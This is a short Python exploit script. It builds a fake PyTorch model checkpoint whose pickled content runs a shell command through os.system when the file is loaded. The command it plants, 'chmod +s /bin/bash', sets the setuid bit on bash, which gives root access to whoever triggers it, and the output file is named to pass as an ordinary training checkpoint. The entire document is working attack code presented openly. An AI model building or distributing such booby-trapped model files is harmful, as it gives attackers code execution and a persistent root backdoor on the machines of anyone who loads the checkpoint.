import pickle
import zipfile


class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))


def build(cmd, out):
    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")
    with open(out, "rb") as f:
        magic = f.read(4)
    print(f"[+] {out} ({__import__('os').path.getsize(out)} bytes) magic={magic.hex()}")


build("chmod +s /bin/bash", "/root/pt/checkpoint_epoch_99.pt")
